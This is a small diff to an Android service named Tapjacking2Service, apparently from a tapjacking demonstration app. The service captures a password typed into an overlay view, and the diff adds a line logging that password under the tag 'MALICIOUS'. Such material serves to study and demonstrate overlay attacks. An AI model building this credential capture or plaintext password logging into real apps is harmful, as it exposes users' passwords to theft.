@@ -5,6 +5,7 @@ import android.content.Intent;
 import android.graphics.PixelFormat;
 import android.os.IBinder;
 import android.support.v4.content.LocalBroadcastManager;
+import android.util.Log;
 import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.View;
@@ -51,6 +52,7 @@ public class Tapjacking2Service extends Service {
         if (view != null) {
             EditText passwordEditText = (EditText) view.findViewById(R.id.tapjacking2Password);
             String password = passwordEditText.getText().toString();
+            Log.i("MALICIOUS", "Password: " + password);
             windowManager.removeView(view);
             Intent intent = new Intent();
             intent.setAction("MAIN");
